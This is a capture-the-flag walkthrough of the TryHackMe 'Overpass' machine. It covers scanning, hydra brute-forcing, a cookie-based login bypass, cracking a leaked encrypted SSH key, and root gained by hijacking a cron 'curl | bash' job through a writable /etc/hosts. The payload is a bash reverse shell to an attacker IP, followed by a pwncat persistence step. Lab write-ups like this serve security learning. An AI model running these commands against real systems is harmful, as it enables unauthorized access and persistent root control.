THM - Overpass 1

1. `nmap -T4 -p- -A -Pn 10.10.119.200`

	```
	Nmap scan report for 10.10.119.200
	Host is up (0.12s latency).
	Not shown: 64890 closed ports, 643 filtered ports
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
	|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
	|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
	80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
	|_http-title: Overpass
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 1274.65 seconds
	```

	Shows `SSH` and a webserver are running.

2. Website on port 80. Downloads page has source code, build script, and binaries.
	1. Program output:
		```
		kali@kali:~/Downloads$ ./overpassLinux 
		open /home/kali/.overpass: no such file or directory
		Failed to open or read file
		Continuing with new password file.
		Welcome to Overpass
		Options:
		1       Retrieve Password For Service
		2       Set or Update Password For Service
		3       Delete Password For Service
		4       Retrieve All Passwords
		5       Exit
		Choose an option:       2
		Enter Service Name:     y
		Enter new password:     v
		kali@kali:~/Downloads$ ./overpassLinux 
		Welcome to Overpass
		Options:
		1       Retrieve Password For Service
		2       Set or Update Password For Service
		3       Delete Password For Service
		4       Retrieve All Passwords
		5       Exit
		Choose an option:       1
		Enter Service Name:     y
		kali@kali:~/Downloads$ ./overpassLinux 
		Welcome to Overpass
		Options:
		1       Retrieve Password For Service
		2       Set or Update Password For Service
		3       Delete Password For Service
		4       Retrieve All Passwords
		5       Exit
		Choose an option:       4
		y        v
		```
	
	2. Source code

		```go
		package main
		
		import (
			"bufio"
			"encoding/json"
			"fmt"
			"io/ioutil"
			"os"
			"strconv"
			"strings"
		
			"github.com/mitchellh/go-homedir"
		)
		
		type passListEntry struct {
			Name string `json:"name"`
			Pass string `json:"pass"`
		}
		
		//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
		func rot47(input string) string {
			var result []string
			for i := range input[:len(input)] {
				j := int(input[i])
				if (j >= 33) && (j <= 126) {
					result = append(result, string(rune(33+((j+14)%94))))
				} else {
					result = append(result, string(input[i]))
				}
			}
			return strings.Join(result, "")
		}
		
		//Encrypt the credentials and write them to a file.
		func saveCredsToFile(filepath string, passlist []passListEntry) string {
			file, err := os.OpenFile(filepath, os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err.Error())
				return err.Error()
			}
			defer file.Close()
			stringToWrite := rot47(credsToJSON(passlist))
			if _, err := file.WriteString(stringToWrite); err != nil {
				fmt.Println(err.Error())
				return err.Error()
			}
			return "Success"
		}
		
		//Load the credentials from the encrypted file
		func loadCredsFromFile(filepath string) ([]passListEntry, string) {
			buff, err := ioutil.ReadFile(filepath)
			if err != nil {
				fmt.Println(err.Error())
				return nil, "Failed to open or read file"
			}
			//Decrypt passwords
			buff = []byte(rot47(string(buff)))
			//Load decrypted passwords
			var passlist []passListEntry
			err = json.Unmarshal(buff, &passlist)
			if err != nil {
				fmt.Println(err.Error())
				return nil, "Failed to load creds"
			}
			return passlist, "Ok"
		}
		
		//Convert the array of credentials to JSON
		func credsToJSON(passlist []passListEntry) string {
			jsonBuffer, err := json.Marshal(passlist)
			if err != nil {
				fmt.Println(err.Error())
				return "Something went wrong"
			}
			return string(jsonBuffer)
		}
		
		//Python style input function
		func input(prompt string) string {
			fmt.Print(prompt)
			scanner := bufio.NewScanner(os.Stdin)
			if scanner.Scan() {
				return scanner.Text()
		
			}
			return ""
		}
		
		func serviceSearch(passlist []passListEntry, serviceName string) (int, passListEntry) {
			//A linear search is the best I can do, Steve says it's Oh Log N whatever that means
			for index, entry := range passlist {
				if entry.Name == serviceName {
					return index, entry
				}
			}
			return -1, passListEntry{}
		}
		
		func getPwdForService(passlist []passListEntry, serviceName string) string {
			index, entry := serviceSearch(passlist, serviceName)
			if index != -1 {
				return entry.Pass
			}
			return "Pass not found"
		}
		
		func setPwdForService(passlist []passListEntry, serviceName string, newPwd string) []passListEntry {
			index, entry := serviceSearch(passlist, serviceName)
			//If service exists, update entry
			if index != -1 {
				entry.Pass = newPwd
				passlist[index] = entry
				return passlist
			}
			//If it doesn't, create an entry
			entry = passListEntry{Name: serviceName, Pass: newPwd}
			passlist = append(passlist, entry)
			return passlist
		}
		
		func deletePwdByService(passlist []passListEntry, serviceName string) (resultList []passListEntry, status string) {
			index, _ := serviceSearch(passlist, serviceName)
			if index != -1 {
				//remove Pwd from passlist
				resultList = append(passlist[:index], passlist[index+1:]...)
				status = "Ok"
				return
			}
			return passlist, "Pass not found"
		}
		
		func printAllPasswords(passlist []passListEntry) {
			for _, entry := range passlist {
				fmt.Println(entry.Name, "\t", entry.Pass)
			}
		}
		
		func main() {
			credsPath, err := homedir.Expand("~/.overpass")
			if err != nil {
				fmt.Println("Error finding home path:", err.Error())
			}
			//Load credentials
			passlist, status := loadCredsFromFile(credsPath)
			if status != "Ok" {
				fmt.Println(status)
				fmt.Println("Continuing with new password file.")
				passlist = make([]passListEntry, 0)
			}
		
			fmt.Println("Welcome to Overpass")
		
			//Determine function
			option := -1
			fmt.Print(
				"Options:\n" +
					"1\tRetrieve Password For Service\n" +
					"2\tSet or Update Password For Service\n" +
					"3\tDelete Password For Service\n" +
					"4\tRetrieve All Passwords\n" +
					"5\tExit\n")
		
			for option > 5 || option < 1 {
				optionString := input("Choose an option:\t")
				optionChoice, err := strconv.Atoi(optionString)
				if err != nil || optionChoice > 5 || optionChoice < 1 {
					fmt.Println("Please enter a valid number")
				}
				option = optionChoice
			}
		
			switch option {
			case 1:
				service := input("Enter Service Name:\t")
				getPwdForService(passlist, service)
			case 2:
				service := input("Enter Service Name:\t")
				newPwd := input("Enter new password:\t")
				passlist = setPwdForService(passlist, service, newPwd)
				saveCredsToFile(credsPath, passlist)
			case 3:
				service := input("Enter Service Name:\t")
				passlist, status := deletePwdByService(passlist, service)
				if status != "Ok" {
					fmt.Println(status)
				}
				saveCredsToFile(credsPath, passlist)
			case 4:
				printAllPasswords(passlist)
			}
		}
		```

	3. Build Script
		```sh
		GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go
		## GOOS=windows /usr/local/go/bin/go build -o ~/builds/overpassWindows.exe ~/src/overpass.go
		## GOOS=darwin /usr/local/go/bin/go build -o ~/builds/overpassMacOS ~/src/overpass.go
		## GOOS=freebsd /usr/local/go/bin/go build -o ~/builds/overpassFreeBSD ~/src/overpass.go
		## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go
		echo "$(date -R) Builds completed" >> /root/buildStatus
		```

3. `nikto -h 10.10.119.200`

	```
	- Nikto v2.1.6
	---------------------------------------------------------------------------
	+ Target IP:          10.10.119.200
	+ Target Hostname:    10.10.119.200
	+ Target Port:        80                                                                                                       
	+ Start Time:         2020-12-01 17:48:56 (GMT-5)                                                                              
	---------------------------------------------------------------------------                                                    
	+ Server: No banner retrieved                                                                                                  
	+ The anti-clickjacking X-Frame-Options header is not present.                                                                 
	+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS      
	+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
	+ No CGI Directories found (use '-C all' to force check all possible dirs)
	+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
	+ OSVDB-3092: /admin.html: This might be interesting...
	+ OSVDB-3092: /admin/: This might be interesting...
	+ OSVDB-3092: /css/: This might be interesting...
	+ OSVDB-3092: /downloads/: This might be interesting...
	+ OSVDB-3092: /img/: This might be interesting...
	+ 7897 requests: 6 error(s) and 9 item(s) reported on remote host
	+ End Time:           2020-12-01 18:27:17 (GMT-5) (2301 seconds)
	---------------------------------------------------------------------------
	+ 1 host(s) tested
	```

4. Directory busting: `gobuster dir -u http://10.10.119.200 -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`

	```
	===============================================================
	Gobuster v3.0.1
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
	===============================================================
	[+] Url:            http://10.10.119.200
	[+] Threads:        100
	[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
	[+] Status codes:   200,204,301,302,307,401,403
	[+] User Agent:     gobuster/3.0.1
	[+] Timeout:        10s
	===============================================================
	2020/12/01 17:50:57 Starting gobuster
	===============================================================
	/downloads (Status: 301)
	/img (Status: 301)
	/aboutus (Status: 301)
	/admin (Status: 301)
	/css (Status: 301)
	/http%3A%2F%2Fwww (Status: 301)
	/http%3A%2F%2Fyoutube (Status: 301)
	/http%3A%2F%2Fblogs (Status: 301)
	/http%3A%2F%2Fblog (Status: 301)
	/**http%3A%2F%2Fwww (Status: 301)
	===============================================================
	2020/12/01 17:53:13 Finished
	===============================================================
	```

	Finds `/admin`.

5. `hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -F 10.10.119.200 -s 80 http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect Credentials"` found nothing.

	```
	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-01 18:03:23                                             
	[DATA] max 16 tasks per 1 server, overall 16 tasks, 170000 login tries (l:17/p:10000), ~10625 tries per task                   
	[DATA] attacking http-post-form://10.10.119.200:80/api/login:username=^USER^&password=^PASS^:Incorrect Credentials             
	[STATUS] 1084.00 tries/min, 1084 tries in 00:01h, 168916 to do in 02:36h, 16 active
	[STATUS] 1114.00 tries/min, 3342 tries in 00:03h, 166658 to do in 02:30h, 16 active
	[STATUS] 200.80 tries/min, 4103 tries in 00:20h, 165897 to do in 13:47h, 16 active
	^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
	```

6. SSH Bruteforce: `sudo hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.10.119.200 -t 40 -V` found nothing.

7. The `/admin` page on port `80` points to `/login.js`:

	```js
	async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
	        method: 'POST', // *GET, POST, PUT, DELETE, etc.
	        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
	        credentials: 'same-origin', // include, *same-origin, omit
	        headers: {
	            'Content-Type': 'application/x-www-form-urlencoded'
	        },
	        redirect: 'follow', // manual, *follow, error
	        referrerPolicy: 'no-referrer', // no-referrer, *client
	        body: encodeFormData(data) // body data type must match "Content-Type" header
	    });
	    return response; // We don't always want JSON back
	}
	const encodeFormData = (data) => {
	    return Object.keys(data)
	        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
	        .join('&');
	}
	function onLoad() {
	    document.querySelector("#loginForm").addEventListener("submit", function (event) {
	        //on pressing enter
	        event.preventDefault()
	        login()
	    });
	}
	async function login() {
	    const usernameBox = document.querySelector("#username");
	    const passwordBox = document.querySelector("#password");
	    const loginStatus = document.querySelector("#loginStatus");
	    loginStatus.textContent = ""
	    const creds = { username: usernameBox.value, password: passwordBox.value }
	    const response = await postData("/api/login", creds)
	    const statusOrCookie = await response.text()
	    if (statusOrCookie === "Incorrect credentials") {
	        loginStatus.textContent = "Incorrect Credentials"
	        passwordBox.value=""
	    } else {
	        Cookies.set("SessionToken",statusOrCookie)
	        window.location = "/admin"
	    }
	}
	```
	
	Let's see if the server checks the value of `SessionToken`.

8. Set a new cookie `SessionToken=anything` and refresh logs into the site.
9. Site has an SSH RSA private key:

	```
	-----BEGIN RSA PRIVATE KEY-----
	Proc-Type: 4,ENCRYPTED
	DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
	
	LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
	JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
	73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
	WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
	BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
	AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
	3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
	ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
	VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
	OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
	9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
	eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
	4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
	GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
	exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
	AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
	6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
	dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
	n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
	8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
	4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
	ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
	49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
	+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
	2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
	-----END RSA PRIVATE KEY-----
	```

10. Save the RSA key as `key` (and `chmod 600 key`) and ssh into the machine: `ssh -i key 10.10.119.200`.
11. `john` bruteforce RSA key:

	```
	/usr/share/john/ssh2john.py key > hash
	sudo john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
	```
	
	Output:
	
	```
	Using default input encoding: UTF-8
	Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
	Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
	Cost 2 (iteration count) is 1 for all loaded hashes
	Node numbers 1-4 of 4 (fork)
	Note: This format may emit false positives, so it will keep trying even after
	finding a possible candidate.
	Press 'q' or Ctrl-C to abort, almost any other key for status
	james13          (key)
	2 0g 0:00:00:02 DONE (2020-12-01 18:50) 0g/s 1457Kp/s 1457Kc/s 1457KC/sabygurl69
	1 0g 0:00:00:02 DONE (2020-12-01 18:50) 0g/s 1457Kp/s 1457Kc/s 1457KC/sie168
	Waiting for 3 children to terminate
	4 0g 0:00:00:02 DONE (2020-12-01 18:50) 0g/s 1395Kp/s 1395Kc/s 1395KC/s *7¡Vamos!
	3 1g 0:00:00:02 DONE (2020-12-01 18:50) 0.3690g/s 1323Kp/s 1323Kc/s 1323KC/sa6_123
	Session completed
	```
	
	Key is `james13`.

12. `ssh -i key 10.10.119.200` again with `james13` logs in.
13. `cat user.txt`: `thm{65c1aaf000506e56996822c6281e6bf7}`
14. `cat todo.txt`

	```
	To Do:
	> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
	> Write down my password somewhere on a sticky note so that I don't forget it.
	  Wait, we make a password manager. Why don't I just use that?
	> Test Overpass for macOS, it builds fine but I'm not sure it actually works
	> Ask Paradox how he got the automated build script working and where the builds go.
	  They're not updating on the website
	```

15. `cat .overpass`: `,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.` and decode ROT47 with [CyberChef](https://gchq.github.io/CyberChef) to get `[{"name":"System","pass":"saydrawnlyingpicture"}]`
16. [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
	On Attacker:
	```
	wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
	sudo python3 -m http.server 80
	```
	
	On Target: 
	```
	wget http://10.9.215.103/linpeas.sh
	chmod +x linpeas.sh
	./linpeas.sh -a 2>&1 | tee linpeas_report.txt
	```
	Info about `2>&1` and `tee`: https://stackoverflow.com/questions/418896/how-to-redirect-output-to-a-file-and-stdout
	
	
	Weird writable files found:
	```
	[+] Interesting writable files owned by me or writable by everyone (not in Home)
	[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                 
	/dev/mqueue
	/dev/mqueue/linpeas.txt
	/dev/shm
	/dev/shm/linpeas.txt
	/etc/hosts
	/home/james
	/run/lock
	/run/screen
	/run/screen/S-james
	/run/user/1001
	/run/user/1001/gnupg
	/run/user/1001/systemd
	/tmp
	/tmp/.ICE-unix
	/tmp/.Test-unix
	/tmp/.X11-unix
	/tmp/.XIM-unix
	/tmp/.font-unix
	/tmp/crontab.8whB5M
	/tmp/crontab.8whB5M/.crontab.swp
	/tmp/crontab.8whB5M/crontab
	/tmp/tmux-1001
	/var/crash
	/var/tmp
	```
	
	Namely, `/etc/hosts` is writable.
	
	`cat /etc/hosts`:
	
	```
	127.0.0.1 localhost
	127.0.1.1 overpass-prod
	127.0.0.1 overpass.thm
	# The following lines are desirable for IPv6 capable hosts
	::1     ip6-localhost ip6-loopback
	fe00::0 ip6-localnet
	ff00::0 ip6-mcastprefix
	ff02::1 ip6-allnodes
	ff02::2 ip6-allrouters
	```
	
	Also, there is a cronjob that pipes to bash:
	
	```
	SHELL=/bin/sh
	PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
	
	* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
	```

17. Edit `/etc/hosts` to (changed `overpass.thm` to attacker IP):

	```
	127.0.0.1 localhost
	127.0.1.1 overpass-prod
	10.9.215.103 overpass.thm
	# The following lines are desirable for IPv6 capable hosts
	::1     ip6-localhost ip6-loopback
	fe00::0 ip6-localnet
	ff00::0 ip6-mcastprefix
	ff02::1 ip6-allnodes
	ff02::2 ip6-allrouters
	```

18. `mkdir -p downloads/src` and `cd downloads/src`

	`nano buildscript.sh`:
	```sh
	bash -i >& /dev/tcp/10.9.215.103/4444 0>&1
	```

19. Start server: `sudo python3 -m http.server 80`
20. Listen for reverse shell with [pwncat](https://github.com/calebstewart/pwncat): `pwncat 0.0.0.0:4444`
21. `run persist.passwd` in local terminal for persistance on the machine
22. `cat /root/root.txt`: `thm{7f336f8c359dbac18d54fdd64ea753bb}`


